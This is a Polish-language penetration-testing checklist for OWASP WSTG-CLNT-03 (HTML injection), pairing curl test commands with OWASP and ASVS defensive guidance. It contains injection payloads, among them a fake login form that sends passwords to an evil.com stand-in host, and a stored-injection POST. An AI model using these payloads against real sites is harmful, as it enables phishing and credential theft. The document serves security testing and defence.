# WSTG-CLNT-03 — Testing for HTML Injection

## Cele

- Identify HTML injection points and assess the severity

## KOMENDY

### Wstrzykiwanie HTML

```bash
curl -s "https://TARGET/search?q=<h1>Injected</h1>" | grep -i "<h1>Injected"
curl -s "https://TARGET/search?q=<a href=\"http://evil.com\">Click</a>" | grep -i "evil.com"
curl -s "https://TARGET/search?q=<form action=\"http://evil.com\"><input type=text name=user><input type=submit></form>"
curl -s "https://TARGET/search?q=<img src=http://evil.com/logo.png>"

```

### Stored HTML injection

```bash
curl -X POST "https://TARGET/comment" -d "body=<marquee>HTML Injected</marquee>"

```

## KOMENDY Z WORDLISTAMI

### Subset of XSS payloads (HTML only, no JS)

```bash
# Desktop/WSTG/SecLists-master/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt
# Desktop/WSTG/fuzzdb-master/attack/xss/xss-other.txt

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Testuj wstrzykiwanie tagow HTML w kazde pole wejsciowe
2. Sprawdz czy tagi sa renderowane w przegladarce
3. Testuj phishing via HTML injection (fałszywe formularze)
4. Sprawdz Content-Type i encoding odpowiedzi


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross_Site_Scripting_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### HTML Injection — czym jest

- Atakujacy wstrzykuje HTML ktory jest renderowany w kontekscie przegladarki ofiary
- Roznica od XSS: HTML injection nie musi zawierac JavaScript — moze to byc falszywy formularz (phishing)
- Payload: `<form action="https://evil.com/steal"><input name="pass" type="password"><input type="submit" value="Login"></form>`

### Output Encoding — primary defense

- **HTML context**: encode `&`, `<`, `>`, `"`, `'` jako HTML entities
- **HTML attribute**: encode WSZYSTKIE nie-alfanumeryczne znaki jako `&#xHH;`
- **URL context**: URL encode parametrow
- Uzywaj **frameworkowego auto-escaping** — NIE wylaczaj go (React, Angular, Vue domyslnie enkoduja)

### HTML Sanitization

- Jesli MUSISZ akceptowac HTML od uzytkownika — uzyj **DOMPurify** (client) lub **Bleach** (Python)
- **Allowlist** tagow: `<b>`, `<i>`, `<p>`, `<br>`, `<ul>`, `<li>` — TYLKO bezpieczne tagi
- **Allowlist** atrybutow: `class`, `id`, `href` (z walidacja URL) — NIGDY event handlers
- **NIGDY** nie uzywaj regex do sanityzacji HTML — zbyt skomplikowane, latwe do obejscia

### Content-Type i encoding

- Ustaw `Content-Type: text/html; charset=UTF-8` — zapobiega sniffingowi charset
- Ustaw `X-Content-Type-Options: nosniff` — przegladarka nie bedzie zgadywac typu MIME
- Brak charset = przegladarka moze zinterpretowac dane w innym encoding → obejscie filtrow

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.1 | Injection Prevention | Verify that output encoding for an HTTP response, HTML document, or XML document is relevant for the context required, such as encoding the relevant characters for HTML elements, HTML attributes, HTML comments, CSS, or HTTP header fields, to avoid changing the message or document structure. |
| V3.2.2 | Unintended Content Interpretation | Verify that content intended to be displayed as text, rather than rendered as HTML, is handled using safe rendering functions (such as createTextNode or textContent) to prevent unintended execution of content such as HTML or JavaScript. |
